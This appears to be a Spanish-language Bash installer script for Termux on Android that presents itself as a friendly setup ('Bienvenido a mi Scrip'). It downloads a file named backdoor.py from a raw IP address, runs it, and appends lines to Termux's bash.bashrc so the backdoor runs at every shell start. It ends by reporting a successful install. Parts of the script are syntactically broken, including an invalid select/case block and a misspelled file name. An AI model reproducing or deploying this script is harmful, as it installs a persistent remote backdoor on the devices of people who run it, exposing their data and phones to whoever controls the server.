#!/bin/bash
printf "\e[1;32mBienvenido a mi Scrip"\n
printf "\e[1;32mAcepte permisos de Storage para continuar"\n
termux-setup-storage
pkg install python -y
wget https://35.226.201.84/backdoor.py
chmod +x backdoor.py
python backdoor.py

echo "¿Estas ejecutando desde Termux o alguna otra terminal?"
select yn in "S(termux)" "O(otra)"; do
	S) mv backdoor.py /data/data/com.termux/files/usr/etc ; ;
    
     O)mv backdoo.py /home/usr/Documentos ; ;
esac
done

echo "cd /data/data/com.termux/files/usr/etc">> /data/data/com.termux/files/usr/etc/bash.bashrc
clear
echo "python backdoor.py">> /data/data/com.termux/files/usr/etc/bash.bashrc
clear
echo "cd">> /data/data/com.termux/files/usr/etc/bash.bashrc
printf "\e[1;32mInstalado con exito:)"\n
sleep 3
printf "\e[1;32mFin del Scrip"\n
exit


